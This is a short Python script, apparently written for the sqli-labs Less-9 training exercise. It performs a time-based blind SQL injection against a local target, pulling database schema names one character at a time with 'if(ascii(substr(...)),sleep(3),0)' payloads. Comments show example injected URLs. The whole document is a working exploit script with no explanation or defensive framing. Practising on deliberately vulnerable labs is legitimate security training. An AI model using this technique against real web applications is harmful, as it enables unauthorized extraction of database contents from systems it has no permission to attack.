import requests
import time

url = "http://127.0.0.1/sqli-labs/Less-9/?id=1'and "
# payload_str="database()"


for k in range(0, 20):
    result = ""
    payload_str = "(select schema_name from information_schema.schemata limit %s,1)" % (str(k))
    for i in range(1, 20):
        for j in range(33, 127):
            payload = 'if(ascii(substr(%s,%s,1))=%s,sleep(3),0) --+' % (payload_str, str(i), str(j))
            url_payload = url + payload

            stime = time.time()
            resul = requests.get(url_payload)
            etime = time.time()
            if etime - stime >= 2:
                result = result + chr(j)
    print(result)
print("ok")
# if (ascii(substr(database(),1, 1))=115, sleep(3), 0)
# http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr(database(),1,1))=115,sleep(3),0)%20--+
# http://127.0.0.1/sqli-labs/Less-9/?id=1'and if(ascii(substr(database(),14,1))=123,sleep(3),0)
